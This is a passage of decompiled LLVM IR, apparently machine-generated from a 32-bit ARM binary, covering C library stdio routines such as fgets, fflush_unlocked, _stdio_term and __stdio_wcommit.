  %v5_de8c = xor i32 %v4_de8c, %v0_de8c
  store i32 %v5_de8c, i32* %r5.global-to-local, align 4
  %v3_de90 = sdiv i32 %v5_de8c, 256
  %v1_de94 = trunc i32 %v3_de90 to i8
  store i8 %v1_de94, i8* @global_var_1b7c9.299, align 1
  %v0_de98 = load i32, i32* %r8.global-to-local, align 4
  %v1_de98 = load i32, i32* @r7, align 4
  %v2_de98 = inttoptr i32 %v1_de98 to i32*
  store i32 %v0_de98, i32* %v2_de98, align 4
  %v0_de9c = load i32, i32* %r5.global-to-local, align 4
  %v1_de9c = trunc i32 %v0_de9c to i8
  store i8 %v1_de9c, i8* @global_var_1b7c8.300, align 1
  %v2_dea0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dea0, i32* @r4, align 4
  store i32 %v9_de38, i32* @r6, align 4
  ret i32 %v1_de88

; uselistorder directives
  uselistorder i32 %v1_de88, { 1, 0 }
  uselistorder i32 %v0_de64, { 1, 0 }
  uselistorder i8* @global_var_1b7c8.300, { 1, 0 }
  uselistorder i8* @global_var_1b7c9.299, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_1b779.298, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1250c.302 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_deb0 = call i32 @memcpy()
  %v0_deb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_deb4, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_deb0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_deb8 = load i32, i32* @r4, align 4
  store i32 %v3_deb8, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1b744.291 to i32), i32* @r0, align 4
  %v0_dec0 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1b75c.273 to i32), i32* @r0, align 4
  %v0_dec8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_1b740.295 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_1b740.295 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_df246 = add i32 %storemerge5, 56
  store i32 %v1_df246, i32* @r5, align 4
  %v2_df288 = icmp eq i32 %storemerge5, 0
  store i32 %v1_df246, i32* %r0.global-to-local, align 4
  br i1 %v2_df288, label %dec_label_pc_df34, label %dec_label_pc_ded8

dec_label_pc_ded8:                                ; preds = %entry, %dec_label_pc_df14
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r3.global-to-local, align 4
  store i32 57060, i32* @lr, align 4
  %v1_dee0 = call i32 @__pthread_return_0()
  %v2_dee4 = icmp eq i32 %v1_dee0, 0
  %v0_dee8 = load i32, i32* @r5, align 4
  store i32 %v0_dee8, i32* @r0, align 4
  br i1 %v2_dee4, label %dec_label_pc_df14, label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %dec_label_pc_ded8
  %v0_def0 = load i32, i32* @r4, align 4
  %v1_def0 = add i32 %v0_def0, 8
  %v2_def0 = inttoptr i32 %v1_def0 to i32*
  %v3_def0 = load i32, i32* %v2_def0, align 4
  store i32 %v3_def0, i32* %r3.global-to-local, align 4
  %v3_def8 = inttoptr i32 %v0_def0 to i8*
  store i8 48, i8* %v3_def8, align 1
  %v2_df00 = load i32, i32* @r4, align 4
  %v3_df00 = add i32 %v2_df00, 1
  %v4_df00 = inttoptr i32 %v3_df00 to i8*
  store i8 0, i8* %v4_df00, align 1
  %v0_df04 = load i32, i32* %r3.global-to-local, align 4
  %v1_df04 = load i32, i32* @r4, align 4
  %v2_df04 = add i32 %v1_df04, 20
  %v3_df04 = inttoptr i32 %v2_df04 to i32*
  store i32 %v0_df04, i32* %v3_df04, align 4
  %v0_df08 = load i32, i32* %r3.global-to-local, align 4
  %v1_df08 = load i32, i32* @r4, align 4
  %v2_df08 = add i32 %v1_df08, 24
  %v3_df08 = inttoptr i32 %v2_df08 to i32*
  store i32 %v0_df08, i32* %v3_df08, align 4
  %v0_df0c = load i32, i32* %r3.global-to-local, align 4
  %v1_df0c = load i32, i32* @r4, align 4
  %v2_df0c = add i32 %v1_df0c, 28
  %v3_df0c = inttoptr i32 %v2_df0c to i32*
  store i32 %v0_df0c, i32* %v3_df0c, align 4
  %v0_df10 = load i32, i32* %r3.global-to-local, align 4
  %v1_df10 = load i32, i32* @r4, align 4
  %v2_df10 = add i32 %v1_df10, 16
  %v3_df10 = inttoptr i32 %v2_df10 to i32*
  store i32 %v0_df10, i32* %v3_df10, align 4
  br label %dec_label_pc_df14

dec_label_pc_df14:                                ; preds = %dec_label_pc_ded8, %dec_label_pc_def0
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_df18 = load i32, i32* @r4, align 4
  %v2_df18 = add i32 %v1_df18, 52
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  store i32 1, i32* %v3_df18, align 4
  %v0_df1c = call i32 @__stdio_init_mutex()
  store i32 %v0_df1c, i32* %r0.global-to-local, align 4
  %v0_df20 = load i32, i32* @r4, align 4
  %v1_df20 = add i32 %v0_df20, 32
  %v2_df20 = inttoptr i32 %v1_df20 to i32*
  %storemerge = load i32, i32* %v2_df20, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_df24 = add i32 %storemerge, 56
  store i32 %v1_df24, i32* @r5, align 4
  %v2_df28 = icmp eq i32 %storemerge, 0
  store i32 %v1_df24, i32* %r0.global-to-local, align 4
  br i1 %v2_df28, label %dec_label_pc_df24.dec_label_pc_df34_crit_edge, label %dec_label_pc_ded8

dec_label_pc_df24.dec_label_pc_df34_crit_edge:    ; preds = %dec_label_pc_df14
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1b740.295 to i32*), align 4
  br label %dec_label_pc_df34

dec_label_pc_df34:                                ; preds = %dec_label_pc_df24.dec_label_pc_df34_crit_edge, %entry
  %v11_df5c13 = phi i32 [ %v1_df24, %dec_label_pc_df24.dec_label_pc_df34_crit_edge ], [ %v1_df246, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_df24.dec_label_pc_df34_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_1b740.295 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_df544 = icmp eq i32 %storemerge12, 0
  br i1 %v2_df544, label %dec_label_pc_df5c, label %dec_label_pc_df40

dec_label_pc_df40:                                ; preds = %dec_label_pc_df34, %dec_label_pc_df40
  %v0_df48 = phi i32 [ %storemerge1, %dec_label_pc_df40 ], [ %storemerge12, %dec_label_pc_df34 ]
  %v1_df40 = inttoptr i32 %v0_df48 to i8*
  %v2_df40 = load i8, i8* %v1_df40, align 1
  %v3_df40 = zext i8 %v2_df40 to i32
  store i32 %v3_df40, i32* %r3.global-to-local, align 4
  %v1_df44 = and i32 %v3_df40, 64
  store i32 %v0_df48, i32* %r0.global-to-local, align 4
  store i32 57168, i32* @lr, align 4
  %v1_df4c = icmp ne i32 %v1_df44, 0
  call void @__pseudo_cond_branch(i1 %v1_df4c, i32 ptrtoint (i32* @global_var_df70.307 to i32))
  %v0_df50 = load i32, i32* %r4.global-to-local, align 4
  %v1_df50 = add i32 %v0_df50, 32
  %v2_df50 = inttoptr i32 %v1_df50 to i32*
  %storemerge1 = load i32, i32* %v2_df50, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_df54 = icmp eq i32 %storemerge1, 0
  br i1 %v2_df54, label %dec_label_pc_df54.dec_label_pc_df5c_crit_edge, label %dec_label_pc_df40

dec_label_pc_df54.dec_label_pc_df5c_crit_edge:    ; preds = %dec_label_pc_df40
  %v11_df5c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_df5c

dec_label_pc_df5c:                                ; preds = %dec_label_pc_df54.dec_label_pc_df5c_crit_edge, %dec_label_pc_df34
  %v11_df5c = phi i32 [ %v11_df5c.pre, %dec_label_pc_df54.dec_label_pc_df5c_crit_edge ], [ %v11_df5c13, %dec_label_pc_df34 ]
  %v2_df5c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_df5c, i32* @r4, align 4
  ret i32 %v11_df5c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_df40, { 1, 0 }
  uselistorder label %dec_label_pc_df14, { 1, 0 }
  uselistorder label %dec_label_pc_ded8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_df70 = load i32, i32* @r4, align 4
  store i32 %v3_df70, i32* %stack_var_-8, align 4
  %v0_df74 = load i32, i32* @r0, align 4
  %v1_df74 = add i32 %v0_df74, 8
  %v2_df74 = inttoptr i32 %v1_df74 to i32*
  %v3_df74 = load i32, i32* %v2_df74, align 4
  %v1_df78 = add i32 %v0_df74, 16
  %v2_df78 = inttoptr i32 %v1_df78 to i32*
  %v3_df78 = load i32, i32* %v2_df78, align 4
  %v9_df7c = icmp eq i32 %v3_df78, %v3_df74
  store i32 %v0_df74, i32* %r4.global-to-local, align 4
  br i1 %v9_df7c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_df74, i32* %v2_df78, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 57232, i32* @lr, align 4
  %v1_df8c = xor i1 %v9_df7c, true
  call void @__pseudo_cond_branch(i1 %v1_df8c, i32 ptrtoint (i32* @global_var_f4cc.308 to i32))
  %v0_df90 = load i32, i32* %r4.global-to-local, align 4
  %v1_df90 = add i32 %v0_df90, 8
  %v2_df90 = inttoptr i32 %v1_df90 to i32*
  %v3_df90 = load i32, i32* %v2_df90, align 4
  %v1_df94 = add i32 %v0_df90, 16
  %v2_df94 = inttoptr i32 %v1_df94 to i32*
  %v3_df94 = load i32, i32* %v2_df94, align 4
  %v2_df98 = sub i32 %v3_df94, %v3_df90
  %v2_df9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_df9c, i32* @r4, align 4
  ret i32 %v2_df98

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_dfa0 = load i32, i32* @r4, align 4
  store i32 %v3_dfa0, i32* %stack_var_-24, align 4
  %v6_dfa0 = load i32, i32* @r5, align 4
  %v9_dfa0 = load i32, i32* @r6, align 4
  %v12_dfa0 = load i32, i32* @r7, align 4
  %v1_dfa4 = add i32 %arg3, 52
  %v2_dfa4 = inttoptr i32 %v1_dfa4 to i32*
  %v3_dfa4 = load i32, i32* %v2_dfa4, align 4
  store i32 %v3_dfa4, i32* %r8.global-to-local, align 4
  %v2_dfa8 = ptrtoint i32* %stack_var_-40 to i32
  %v1_dfac = add i32 %arg3, 56
  store i32 %v1_dfac, i32* @r5, align 4
  %v2_dfb0 = icmp eq i32 %v3_dfa4, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_dfa8, i32* @r0, align 4
  br i1 %v2_dfb0, label %dec_label_pc_dfd0, label %dec_label_pc_dfec

dec_label_pc_dfd0:                                ; preds = %entry
  %v1_dfd8 = call i32 @__pthread_return_void()
  store i32 57324, i32* @lr, align 4
  %v1_dfe8 = call i32 @__pthread_return_0()
  %v0_dfec.pre = load i32, i32* @r6, align 4
  %v0_dff0.pre = load i32, i32* @r4, align 4
  %v0_dff4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %entry, %dec_label_pc_dfd0
  %v0_dff4 = phi i32 [ %arg1, %entry ], [ %v0_dff4.pre, %dec_label_pc_dfd0 ]
  %v0_dff0 = phi i32 [ %arg3, %entry ], [ %v0_dff0.pre, %dec_label_pc_dfd0 ]
  %v0_dfec = phi i32 [ %arg2, %entry ], [ %v0_dfec.pre, %dec_label_pc_dfd0 ]
  %v3_dff8 = inttoptr i32 %v0_dff4 to i8*
  %v4_dff8 = call i32 @__GI_fgets_unlocked(i8* %v3_dff8, i32 %v0_dfec, i32 %v0_dff0)
  %v0_dffc = load i32, i32* %r8.global-to-local, align 4
  %v2_dffc = icmp eq i32 %v0_dffc, 0
  store i32 %v4_dff8, i32* %r4.global-to-local, align 4
  br i1 %v2_dffc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_dfec
  store i32 57368, i32* @lr, align 4
  call void @__pseudo_branch(i32 49340)
  %v0_e018.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_dfec, %bb
  %v0_e018 = phi i32 [ %v4_dff8, %dec_label_pc_dfec ], [ %v0_e018.pre, %bb ]
  %v2_e020 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e020, i32* @r4, align 4
  store i32 %v6_dfa0, i32* @r5, align 4
  store i32 %v9_dfa0, i32* @r6, align 4
  store i32 %v12_dfa0, i32* @r7, align 4
  ret i32 %v0_e018

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_dfec, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_e038 = ptrtoint i32* %stack_var_-48 to i32
  %v2_e03c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_e03c, i32* @r0, align 4
  store i32 49340, i32* %r4.global-to-local, align 4
  %v1_e050 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r5.global-to-local, align 4
  %v1_e060 = call i32 @__pthread_return_0()
  %v2_e068 = load i32, i32* @global_var_1baf0.275, align 4
  %v7_e06c = icmp eq i32 %v2_e068, 1
  br i1 %v7_e06c, label %dec_label_pc_e074, label %dec_label_pc_e120

dec_label_pc_e074:                                ; preds = %entry
  %v2_e078 = load i32, i32* @global_var_1baf4.279, align 4
  %tmp19 = icmp slt i32 %v2_e078, 1
  br i1 %tmp19, label %dec_label_pc_e120, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %dec_label_pc_e074
  store i32 %v2_e038, i32* @r0, align 4
  %v1_e094 = call i32 @__pthread_return_void()
  %v1_e0a0 = call i32 @__pthread_return_0()
  %v2_e0a8 = load i32, i32* bitcast (i32** @global_var_1b740.295 to i32*), align 4
  store i32 %v2_e0a8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_e0f83 = icmp eq i32 %v2_e0a8, 0
  br i1 %v2_e0f83, label %dec_label_pc_e104, label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e084, %dec_label_pc_e0f4
  %v1_e0cc = phi i32 [ %v0_e0f4, %dec_label_pc_e0f4 ], [ %v2_e0a8, %dec_label_pc_e084 ]
  %v1_e0b4 = inttoptr i32 %v1_e0cc to i8*
  %v2_e0b4 = load i8, i8* %v1_e0b4, align 1
  %v3_e0b4 = zext i8 %v2_e0b4 to i32
  %v1_e0b8 = add i32 %v1_e0cc, 1
  %v2_e0b8 = inttoptr i32 %v1_e0b8 to i8*
  %v3_e0b8 = load i8, i8* %v2_e0b8, align 1
  %v4_e0b8 = zext i8 %v3_e0b8 to i32
  %v4_e0bc = mul nuw nsw i32 %v4_e0b8, 256
  %v5_e0bc = or i32 %v4_e0bc, %v3_e0b4
  %v2_e0c0 = and i32 %v5_e0bc, 32816
  %v7_e0c4 = icmp eq i32 %v2_e0c0, 48
  %v1_e0c8 = add i32 %v1_e0cc, 32
  %v2_e0c8 = inttoptr i32 %v1_e0c8 to i32*
  %v3_e0c8 = load i32, i32* %v2_e0c8, align 4
  store i32 %v3_e0c8, i32* %r5.global-to-local, align 4
  br i1 %v7_e0c4, label %dec_label_pc_e0d4, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e0b4
  store i32 %v1_e0cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e0f4

dec_label_pc_e0d4:                                ; preds = %dec_label_pc_e0b4
  %v0_e0d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e0d4 = icmp eq i32 %v0_e0d4, 0
  br i1 %v2_e0d4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_e0d4
  %v3_e0dc = add i32 %v0_e0d4, 32
  %v4_e0dc = inttoptr i32 %v3_e0dc to i32*
  store i32 %v3_e0c8, i32* %v4_e0dc, align 4
  %v0_e0e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_e0d4
  store i32 %v3_e0c8, i32* bitcast (i32** @global_var_1b740.295 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_e0e4 = phi i32 [ %v0_e0e4.pre, %.thread ], [ %v1_e0cc, %.thread1 ]
  %v1_e0e4 = add i32 %v0_e0e4, 1
  %v2_e0e4 = inttoptr i32 %v1_e0e4 to i8*
  %v3_e0e4 = load i8, i8* %v2_e0e4, align 1
  %v1_e0e8 = and i8 %v3_e0e4, 32
  %v1_e0f0 = icmp ne i8 %v1_e0e8, 0
  call void @__pseudo_cond_branch(i1 %v1_e0f0, i32 ptrtoint (i32* @global_var_b514.240 to i32))
  %v0_e0f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e0f4

dec_label_pc_e0f4:                                ; preds = %.thread12, %bb
  %v0_e0f4 = phi i32 [ %v0_e0f4.pre, %bb ], [ %v3_e0c8, %.thread12 ]
  store i32 %v0_e0f4, i32* %r4.global-to-local, align 4
  %v2_e0f8 = icmp eq i32 %v0_e0f4, 0
  br i1 %v2_e0f8, label %dec_label_pc_e104, label %dec_label_pc_e0b4

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0f4, %dec_label_pc_e084
  store i32 %v2_e038, i32* @r0, align 4
  %v1_e114 = call i32 @__pthread_return_void()
  %v0_e11c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e11c, i32* @global_var_1baf4.279, align 4
  %v2_e124.pre = load i32, i32* @global_var_1baf0.275, align 4
  br label %dec_label_pc_e120

dec_label_pc_e120:                                ; preds = %entry, %dec_label_pc_e074, %dec_label_pc_e104
  %v2_e124 = phi i32 [ %v2_e068, %entry ], [ 1, %dec_label_pc_e074 ], [ %v2_e124.pre, %dec_label_pc_e104 ]
  %v1_e128 = add i32 %v2_e124, -1
  store i32 %v1_e128, i32* @global_var_1baf0.275, align 4
  store i32 %v2_e03c, i32* @r0, align 4
  store i32 57668, i32* @lr, align 4
  %v1_e140 = call i32 @__pthread_return_void()
  ret i32 %v1_e140

; uselistorder directives
  uselistorder i32 %v0_e0f4, { 2, 1, 0 }
  uselistorder i32 %v3_e0c8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e0cc, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_1baf4.279, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e120, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0f4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_e0b4, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_e174 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_1b740.295 to i32), i32* %r3.global-to-local, align 4
  %v10_e17c = icmp eq i8* %arg1, bitcast (i32** @global_var_1b740.295 to i8*)
  store i1 %v10_e17c, i1* %cpsr_z.global-to-local, align 1
  %.v1_e180 = select i1 %v10_e17c, i32 0, i32 %tmp
  store i32 %.v1_e180, i32* %r8.global-to-local, align 4
  %v2_e188 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_e17c, label %bb, label %dec_label_pc_e194

bb:                                               ; preds = %entry
  store i32 %.v1_e180, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1a0

dec_label_pc_e194:                                ; preds = %entry
  %v2_e194 = icmp eq i32 %.v1_e180, 0
  store i1 %v2_e194, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_e194, label %dec_label_pc_e1a0, label %dec_label_pc_e2ec

dec_label_pc_e1a0:                                ; preds = %bb, %dec_label_pc_e194
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_e188, i32* @r0, align 4
  %v1_e1b4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1b75c.273 to i32), i32* %r0.global-to-local, align 4
  %v1_e1c4 = call i32 @__pthread_return_0()
  %v2_e1cc = load i32, i32* @global_var_1baf0.275, align 4
  %v1_e1d0 = add i32 %v2_e1cc, 1
  store i32 %v1_e1d0, i32* %r3.global-to-local, align 4
  store i32 %v1_e1d0, i32* @global_var_1baf0.275, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_e188, i32* @r0, align 4
  %v1_e1e8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_e188, i32* @r0, align 4
  %v1_e1fc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1b744.291 to i32), i32* %r0.global-to-local, align 4
  %v1_e208 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1b740.295 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_e188, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e218 = load i32, i32* bitcast (i32** @global_var_1b740.295 to i32*), align 4
  store i32 %v2_e218, i32* @r6, align 4
  %v1_e220 = call i32 @__pthread_return_void()
  store i32 %v1_e220, i32* %r0.global-to-local, align 4
  store i32 %v2_e188, i32* @r4, align 4
  %v0_e228 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_e228, i32* @r5, align 4
  %v0_e2dc.pr = load i32, i32* @r6, align 4
  %v2_e2dc25 = icmp eq i32 %v0_e2dc.pr, 0
  store i1 %v2_e2dc25, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e2dc25, label %dec_label_pc_e2e4, label %dec_label_pc_e230

dec_label_pc_e230:                                ; preds = %dec_label_pc_e1a0, %.thread11
  %v0_e24c = phi i32 [ %v3_e2d8, %.thread11 ], [ %v0_e2dc.pr, %dec_label_pc_e1a0 ]
  %v1_e230 = inttoptr i32 %v0_e24c to i8*
  %v2_e230 = load i8, i8* %v1_e230, align 1
  %v3_e230 = zext i8 %v2_e230 to i32
  store i32 %v3_e230, i32* %r3.global-to-local, align 4
  %v1_e234 = and i32 %v3_e230, 64
  %v2_e234 = icmp eq i32 %v1_e234, 0
  store i1 %v2_e234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e234, label %.thread11, label %dec_label_pc_e23c

dec_label_pc_e23c:                                ; preds = %dec_label_pc_e230
  %v2_e240 = load i32, i32* @global_var_1b774.285, align 4
  store i32 %v2_e240, i32* %r3.global-to-local, align 4
  %v7_e244 = icmp eq i32 %v2_e240, 2
  store i1 %v7_e244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e244, label %dec_label_pc_e278, label %dec_label_pc_e24c

dec_label_pc_e24c:                                ; preds = %dec_label_pc_e23c
  %v1_e24c = add i32 %v0_e24c, 56
  store i32 %v1_e24c, i32* @r4, align 4
  store i32 %v2_e188, i32* @r0, align 4
  store i32 49340, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r1.global-to-local, align 4
  %v1_e264 = call i32 @__pthread_return_void()
  %v0_e268 = load i32, i32* @r4, align 4
  store i32 %v0_e268, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r3.global-to-local, align 4
  %v1_e274 = call i32 @__pthread_return_0()
  store i32 %v1_e274, i32* %r0.global-to-local, align 4
  %v0_e278.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %dec_label_pc_e23c, %dec_label_pc_e24c
  %v0_e28c = phi i32 [ %v0_e24c, %dec_label_pc_e23c ], [ %v0_e278.pre, %dec_label_pc_e24c ]
  %v1_e278 = inttoptr i32 %v0_e28c to i32*
  %v2_e278 = load i32, i32* %v1_e278, align 4
  %v0_e27c = load i32, i32* %sl.global-to-local, align 4
  %v2_e27c = or i32 %v0_e27c, %v2_e278
  %v1_e280 = xor i32 %v2_e27c, 320
  store i32 %v1_e280, i32* %r3.global-to-local, align 4
  %v1_e284 = and i32 %v1_e280, 832
  %v2_e284 = icmp eq i32 %v1_e284, 0
  store i1 %v2_e284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e284, label %dec_label_pc_e28c, label %bb39

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e278
  store i32 %v0_e28c, i32* @r0, align 4
  %v0_e290 = call i32 @__stdio_wcommit()
  store i32 %v0_e290, i32* %r0.global-to-local, align 4
  %v2_e294 = icmp eq i32 %v0_e290, 0
  store i1 %v2_e294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e294, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_e28c
  %v1_e298 = load i32, i32* @r6, align 4
  %v2_e298 = inttoptr i32 %v1_e298 to i32*
  %v3_e298 = load i32, i32* %v2_e298, align 4
  store i32 %v3_e298, i32* %r3.global-to-local, align 4
  %v2_e29c = add i32 %v1_e298, 8
  %v3_e29c = inttoptr i32 %v2_e29c to i32*
  %v4_e29c = load i32, i32* %v3_e29c, align 4
  %v2_e2a0 = and i32 %v3_e298, -65
  store i32 %v2_e2a0, i32* %r3.global-to-local, align 4
  %v4_e2a4 = sdiv i32 %v3_e298, 256
  store i32 %v4_e2a4, i32* %r1.global-to-local, align 4
  %v3_e2a8 = add i32 %v1_e298, 28
  %v4_e2a8 = inttoptr i32 %v3_e2a8 to i32*
  store i32 %v4_e29c, i32* %v4_e2a8, align 4
  %v1_e2ac = load i32, i32* %r1.global-to-local, align 4
  %v2_e2ac = trunc i32 %v1_e2ac to i8
  %v3_e2ac = load i32, i32* @r6, align 4
  %v4_e2ac = add i32 %v3_e2ac, 1
  %v5_e2ac = inttoptr i32 %v4_e2ac to i8*
  store i8 %v2_e2ac, i8* %v5_e2ac, align 1
  %v0_e2b0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e2b0.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_e2b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e2b0 = trunc i32 %v1_e2b0 to i8
  %v3_e2b0 = load i32, i32* @r6, align 4
  %v4_e2b0 = inttoptr i32 %v3_e2b0 to i8*
  store i8 %v2_e2b0, i8* %v4_e2b0, align 1
  %v0_e2b4.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e2b4.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e28c, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_e278, %.thread6, %.thread7
  %v2_e2bc = load i32, i32* @global_var_1b774.285, align 4
  store i32 %v2_e2bc, i32* %r3.global-to-local, align 4
  %v7_e2c0 = icmp eq i32 %v2_e2bc, 2
  store i1 %v7_e2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2c0, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_e188, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 49340, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 49340)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_e230, %bb40
  %v0_e2d8 = load i32, i32* @r6, align 4
  %v1_e2d8 = add i32 %v0_e2d8, 32
  %v2_e2d8 = inttoptr i32 %v1_e2d8 to i32*
  %v3_e2d8 = load i32, i32* %v2_e2d8, align 4
  store i32 %v3_e2d8, i32* @r6, align 4
  %v2_e2dc = icmp eq i32 %v3_e2d8, 0
  store i1 %v2_e2dc, i1* %cpsr_z.global-to-local, align 1
